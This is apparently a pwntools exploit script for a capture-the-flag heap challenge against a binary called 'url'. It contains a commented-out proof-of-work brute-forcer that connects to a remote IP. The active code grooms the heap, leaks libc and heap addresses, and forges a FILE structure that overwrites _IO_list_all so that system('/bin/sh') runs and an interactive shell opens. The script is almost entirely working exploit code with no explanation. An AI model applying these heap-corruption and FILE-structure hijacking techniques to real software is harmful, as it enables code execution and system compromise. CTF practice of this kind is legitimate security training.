from pwn import *
import hashlib
from string import digits,letters
import random


context.arch = "amd64"


"""
r = remote("47.75.4.252", 10013)


data = r.recvline()
substr = data.split(')')[0].split('+')[1]
ans = data.split()[-1].strip()

total = digits+letters
total*=4
total = list(total)
print total
count = 0
while True:
        count +=1
        if count %10000 == 0:
                print count
        sol = "".join(random.sample(total,4))
        if hashlib.sha256( sol+substr).hexdigest() == ans:
                print "OK"
                r.sendline(sol)
                break








"""


























def encodes(content):
	ans = ""
	content = content.encode("hex")
	for i in range(0,len(content),2):
		ans+="%"+content[i:i+2]
	return ans

def double(content):
	return encodes(content).replace("%","%25")

def create(size,content):
	r.sendlineafter(">","1")
	r.sendlineafter(":",str(size))
	if size > 0:
		r.sendlineafter(":",content)

def encode(idx):
	r.sendlineafter(">","2")
	r.sendlineafter(":",str(idx))

def decode(idx):
	r.sendlineafter(">","3")
	r.sendlineafter(":",str(idx))


def remove(idx):
	r.sendlineafter(">","5")
	r.sendlineafter(":",str(idx))


r = process(["./url"])

create(0xe0,"a")
for i in range(62):
	create(0x400,"a")

create(0x400,"%25"*0x10+"6"+"%2525"+"a"*0x356+"%2500%2500%2501%2500%2500%2500%2500%2500")

decode(0)

create(0x410,"a"*0x10+"6"+"%2525"+"25"*10)


for i in range(64):
	remove(1)

create(0x0,"a")

r.sendlineafter(">","4")
r.recvuntil("0: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x3c52f8

print hex(libc)

create(0x10,"a"*0xd+"%")

decode(0)


create(0x100,"a")
create(0x100,"a")
for i in range(62):
	create(0x400,"a")
create(0x1f0,"a")

remove(64)
remove(66)



main_area = libc+0x3c4b70


create(0x400,"a"*0x108+encodes(p64(main_area))+"a")
r.sendlineafter(">","4")

r.recvuntil("65: ")
heap = u64(r.recvline()[:-1].ljust(8,'\x00'))
print hex(heap)

create(0x1d0,"a")
create(0x400,"a")
create(0x400,"a")

remove(1)
remove(64)

payload = "a"*0x28


system = libc+0x45390
io_list_all = libc+0x3c5520
wide_data_addr = heap+0x318-0x28
vtable_addr = heap+0x318


more = 0x4+0x20*2

stream = "/bin/sh%2500" + double(p64(0x61))
stream += "aaaaaaaa" + double(p64(io_list_all-0x10))
stream = stream.ljust(0xa0+more,"a")
stream += double(p64(wide_data_addr))
stream = stream.ljust(0xc0+more+32,"a")
stream += double(p64(1))
stream += double(p64(0))
stream += double(p64(0))
stream += double(p64(vtable_addr))
stream += double(p64(1))
stream += double(p64(2))
stream += double(p64(3))
stream += double(p64(0))*3 # vtable
stream += double(p64(system))

print hex(len(stream))

create(0x400,payload+stream)
decode(0)

r.sendlineafter(">","1")
r.sendlineafter(":",str(0x1000))












r.interactive()
